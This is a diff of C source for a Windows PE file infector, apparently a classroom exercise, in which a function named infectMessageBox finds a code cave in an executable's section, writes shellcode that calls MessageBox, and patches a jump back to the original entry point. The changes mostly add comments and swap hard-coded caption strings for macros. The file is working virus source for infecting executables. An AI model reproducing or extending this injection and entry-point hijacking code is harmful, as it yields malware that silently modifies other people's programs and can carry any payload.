@@ -10,8 +10,8 @@ DWORD PositionOfSetCaptionInShellcode = POS_SET_CAP;
 DWORD PositionOfSetTextInShellcode    = POS_SET_TEXT;
 DWORD PositionOfCallInShellcode       = POS_CALL;
 DWORD PositionOfJmp                   = POS_JMP;
-UCHAR *Caption = "Infected code";
-UCHAR *Text = "17520074 - 17520467";
+UCHAR *Caption = CAPTION_;
+UCHAR *Text = TEXT_;
 
 int infectMessageBox(
     UCHAR *FileName, 
@@ -23,6 +23,7 @@ int infectMessageBox(
     UCHAR CurrentInputFileName[0xff];
     UCHAR tmpOutFileName[0xff];
     
+    // Create a temporacy file to adjusting
     itoa(rand() * rand(), CurrentInputFileName, 10);
     FinHandle = fopen(FileName, "rb");
     FouHandle = fopen(CurrentInputFileName, "wb");
@@ -30,11 +31,16 @@ int infectMessageBox(
     fclose(FinHandle);
     fclose(FouHandle);
 
-    DWORD nBytesOfPlaceHold = 0x20;
+    // The number of place hold bytes
+    DWORD nBytesOfPlaceHold = 0x10; 
+    // Position of set caption string
     DWORD OffsetOfCaption = (int) endCode - (int) code + nBytesOfPlaceHold;
+    // Position of set text string
     DWORD OffsetOfText = OffsetOfCaption + strlen(Caption) * 2 + 2;
-    DWORD LengthOfShellcode = OffsetOfText + strlen(Text) * 2 + 2 + 0x10;
+    // Size of shellcode
+    DWORD LengthOfShellcode = OffsetOfText + strlen(Text) * 2 + 2 + nBytesOfPlaceHold;
     
+    // Read PE file Header for extracting information
     IMAGE_DOS_HEADER DOSHeader;
     IMAGE_NT_HEADERS32 NTHeaders;
     IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
@@ -42,6 +48,7 @@ int infectMessageBox(
     readPE32Header(FinHandle, &DOSHeader, &NTHeaders, SectionHeaders);
     fclose(FinHandle);
 
+    // Create some variable and struct to pass into function as a reference
     IMAGE_SECTION_HEADER WhereSection; // Section which will be infected with shellcode
     DWORD Length;   // Length of code cave
     DWORD Offset;   // Offset of code cave in file
@@ -139,6 +146,7 @@ int infectMessageBox(
         remove(CurrentInputFileName);
         return 1;
     }
+
     // Copy shellcode to writable memory
     UCHAR *ShellCode = (UCHAR *) malloc(LengthOfShellcode);
     memset(ShellCode, 0, LengthOfShellcode);
@@ -146,15 +154,15 @@ int infectMessageBox(
 
     // Adjust call messagebox instruction
     // Call to a direct address instead of a relative address
-    UCHAR CallShellcode[6] = {0xff, 0x15, 0x00, 0x00, 0x00, 0x00}; 
+    UCHAR CallShellcode[6] = {0xff, 0x15, 0x00, 0x00, 0x00, 0x00}; // a shellcode of direct call instruction
     DWORD2AddressAsShellcode(MesBoxAddress, CallShellcode + 2);
     // Replace a normal call to direct call
     memDel(ShellCode, LengthOfShellcode, PositionOfCallInShellcode, 5);
     memIns(ShellCode, LengthOfShellcode, CallShellcode, 6, PositionOfCallInShellcode);
-    
-    // Adjust jmp instruction jump to old address of entrypoint
     // After ajusting call MessageBox instruction, position of below instructions increase 1
     PositionOfJmp += 1; 
+    
+    // Adjust jmp instruction jump to old address of entrypoint
     DWORD RVAOfJmp = Offset + PositionOfJmp - WhereSection.PointerToRawData + WhereSection.VirtualAddress;
     DWORD RelativeAddressToOldEntryPoint = OldEntryPoint - RVAOfJmp - 5;
     UCHAR JmpShellcode[5] = {0xE9, 0x00, 0x00, 0x00, 0x00};
